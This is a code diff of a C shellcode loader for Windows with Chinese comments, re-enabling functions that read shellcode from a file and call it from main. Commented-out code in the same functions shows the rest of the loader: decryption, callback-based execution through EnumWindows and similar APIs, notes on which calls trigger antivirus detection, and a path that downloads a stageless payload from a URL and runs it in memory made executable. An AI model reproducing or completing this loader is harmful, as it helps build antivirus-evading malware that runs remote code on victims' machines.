@@ -227,91 +227,91 @@ bool ForSD()
 /*
 * 从文件获取shellcode
 */
-//int GetSCPointerFromFile(const char *file,struct ConfigurationData* config,unsigned int **scPointer,unsigned int *scSize)
-//{
-//	HANDLE h=CreateFile(file, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
-//	if (h == INVALID_HANDLE_VALUE) return -1;
-//	*scSize = GetFileSize(h, NULL);
-//	*scPointer = (char*)malloc(*scSize);
-//	if (*scPointer)
-//	{
-//		DWORD RSize;
-//		if (!ReadFile(h, *scPointer, *scSize, &RSize, NULL)) return -1;
-//		if (RSize != *scSize)
-//		{
-//			return -1;
-//		}
-//		return 0;
-//	}
-//	return -1;
-//}
+int GetSCPointerFromFile(const char *file,struct ConfigurationData* config,unsigned int **scPointer,unsigned int *scSize)
+{
+	HANDLE h=CreateFile(file, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
+	if (h == INVALID_HANDLE_VALUE) return -1;
+	*scSize = GetFileSize(h, NULL);
+	*scPointer = (char*)malloc(*scSize);
+	if (*scPointer)
+	{
+		DWORD RSize;
+		if (!ReadFile(h, *scPointer, *scSize, &RSize, NULL)) return -1;
+		if (RSize != *scSize)
+		{
+			return -1;
+		}
+		return 0;
+	}
+	return -1;
+}
 
 /*
 * 解析运行shellcode
 */
-//int RunSCFromFile(const char *file,struct ConfigurationData* config)
-//{
-//	unsigned char* encData = 0;
-//	unsigned int encDataSize = 0;
-//	//解析PE结构，从区段获取SC
-//	if (GetSCPointerFromFile(file ,config, &encData, &encDataSize) == 0)
-//	{
-//		//解密SC
-//		//if (DecryptSC(config, encData, &encDataSize) == 0)
-//		//{
-//		//	free(encData);
-//		//	encData = 0;
-//		//	if (config->shellcode[0] == P_TYPE_STAGE)
-//		//	{
-//		//		//设置跳转代码
-//		//		int amtWritten = (1 + sizeof(DWORD));
-//		//		DWORD jumpOffset = 5;
-//		//		jumpOffset -= amtWritten;
-//		//		{
-//		//			//赋值0xe9
-//		//			//*encData = 0xA1;
-//		//			//*encData ^= 0x48;
-//		//		}
-//
-//		//		//DWORD* jumpTarget = (DWORD*)(encData + sizeof(jmp32bitOffset));
-//		//		//*jumpTarget = jumpOffset;
-//
-//		//		////执行shellcode代码
-//		//		//void_func_ptr callLoc = (void_func_ptr)(encData);
-//		//		//callLoc();//函数调用报毒
-//		//		//EnumWindows((WNDENUMPROC)(callLoc), 0); //函数调用报毒
-//		//		//EnumSystemLanguageGroupsA((LANGUAGEGROUP_ENUMPROCA)callLoc, LGRPID_INSTALLED, NULL);//函数调用报毒
-//		//		//CertEnumSystemStore(0x10000, 0, "system", (PFN_CERT_ENUM_SYSTEM_STORE)callLoc);//函数调用报毒
-//		//	}
-//		//	else if (config->shellcode[0] == P_TYPE_STAGELESSURL)
-//		//	{
-//		//		//unsigned int urllen = *(unsigned int*)(config->shellcode + 1);
-//		//		//unsigned char* url = malloc(urllen + 1);
-//		//		//if (url)
-//		//		//{
-//		//		//	//解析url
-//		//		//	memset(url, 0, urllen + 1);
-//		//		//	memcpy(url, config->shellcode + 1 + 4, urllen);
-//		//		//	GetStageless(url, &config->shellcode, &config->shellcodeSize);
-//		//		//	free(url);
-//		//		//	unsigned int dwBaseAddr = VirtualAlloc(0, config->shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-//		//		//	if (dwBaseAddr)
-//		//		//	{
-//		//		//		memcpy(dwBaseAddr, config->shellcode, config->shellcodeSize);
-//		//		//		free(config->shellcode);
-//		//		//		DWORD oldpro = PAGE_READWRITE;
-//		//		//		if (VirtualProtect(dwBaseAddr, config->shellcodeSize, PAGE_EXECUTE_READWRITE, &oldpro))
-//		//		//			((void(*)())dwBaseAddr)();
-//		//		//	}
-//		//		//}
-//		//		//else
-//		//		//	return -1;
-//		//	}
-//		//	return 0;
-//		//}
-//	}
-//	return -1;
-//}
+int RunSCFromFile(const char *file,struct ConfigurationData* config)
+{
+	unsigned char* encData = 0;
+	unsigned int encDataSize = 0;
+	//解析PE结构，从区段获取SC
+	if (GetSCPointerFromFile(file ,config, &encData, &encDataSize) == 0)
+	{
+		//解密SC
+		//if (DecryptSC(config, encData, &encDataSize) == 0)
+		//{
+		//	free(encData);
+		//	encData = 0;
+		//	if (config->shellcode[0] == P_TYPE_STAGE)
+		//	{
+		//		//设置跳转代码
+		//		int amtWritten = (1 + sizeof(DWORD));
+		//		DWORD jumpOffset = 5;
+		//		jumpOffset -= amtWritten;
+		//		{
+		//			//赋值0xe9
+		//			//*encData = 0xA1;
+		//			//*encData ^= 0x48;
+		//		}
+
+		//		//DWORD* jumpTarget = (DWORD*)(encData + sizeof(jmp32bitOffset));
+		//		//*jumpTarget = jumpOffset;
+
+		//		////执行shellcode代码
+		//		//void_func_ptr callLoc = (void_func_ptr)(encData);
+		//		//callLoc();//函数调用报毒
+		//		//EnumWindows((WNDENUMPROC)(callLoc), 0); //函数调用报毒
+		//		//EnumSystemLanguageGroupsA((LANGUAGEGROUP_ENUMPROCA)callLoc, LGRPID_INSTALLED, NULL);//函数调用报毒
+		//		//CertEnumSystemStore(0x10000, 0, "system", (PFN_CERT_ENUM_SYSTEM_STORE)callLoc);//函数调用报毒
+		//	}
+		//	else if (config->shellcode[0] == P_TYPE_STAGELESSURL)
+		//	{
+		//		//unsigned int urllen = *(unsigned int*)(config->shellcode + 1);
+		//		//unsigned char* url = malloc(urllen + 1);
+		//		//if (url)
+		//		//{
+		//		//	//解析url
+		//		//	memset(url, 0, urllen + 1);
+		//		//	memcpy(url, config->shellcode + 1 + 4, urllen);
+		//		//	GetStageless(url, &config->shellcode, &config->shellcodeSize);
+		//		//	free(url);
+		//		//	unsigned int dwBaseAddr = VirtualAlloc(0, config->shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+		//		//	if (dwBaseAddr)
+		//		//	{
+		//		//		memcpy(dwBaseAddr, config->shellcode, config->shellcodeSize);
+		//		//		free(config->shellcode);
+		//		//		DWORD oldpro = PAGE_READWRITE;
+		//		//		if (VirtualProtect(dwBaseAddr, config->shellcodeSize, PAGE_EXECUTE_READWRITE, &oldpro))
+		//		//			((void(*)())dwBaseAddr)();
+		//		//	}
+		//		//}
+		//		//else
+		//		//	return -1;
+		//	}
+		//	return 0;
+		//}
+	}
+	return -1;
+}
 
 int main(int argc, char* argv[])
 {
@@ -320,7 +320,7 @@ int main(int argc, char* argv[])
 	{
 		return -1;
 	}
-	//struct ConfigurationData config;
-	//memset(&config, 0, sizeof(struct ConfigurationData));
-	//RunSCFromFile(argv[1],&config);
+	struct ConfigurationData config;
+	memset(&config, 0, sizeof(struct ConfigurationData));
+	RunSCFromFile(argv[1],&config);
 }
